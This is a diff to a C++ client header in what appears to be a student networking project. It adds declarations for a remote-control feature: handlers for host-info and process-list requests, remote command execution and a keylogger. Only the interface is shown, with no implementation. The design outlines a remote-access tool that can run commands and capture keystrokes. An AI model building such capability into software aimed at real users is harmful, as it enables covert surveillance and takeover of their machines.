@@ -2,6 +2,8 @@
 #define CLIENT_HPP
 
 #include "../server/LPTF_socket.hpp"
+#include "../protocole/LPTF_Protocol.hpp"
+#include "RemoteControl.hpp"
 #include <string>
 #include <memory>
 
@@ -11,6 +13,7 @@ private:
     std::string server_ip_;
     int server_port_;
     bool is_connected_;
+    std::unique_ptr<RemoteControl> remote_control_;
 
 public:
     Client();
@@ -34,11 +37,20 @@ public:
     void set_server_info(const std::string& ip, int port);
     
     void run_interactive();
+    void run_remote_control_demo();
+    void test_keylogger();
+    
+    bool handle_remote_control_request(const LPTF::LPTF_Packet& request);
 
 private:
     void copy_from(const Client& other);
     void move_from(Client&& other) noexcept;
     void reset();
+    
+    void process_host_info_request();
+    void process_process_list_request();
+    void process_execute_command_request(const LPTF::LPTF_Packet& request);
+    void process_keylogger_request(const LPTF::LPTF_Packet& request);
 };
 
 #endif // CLIENT_HPP
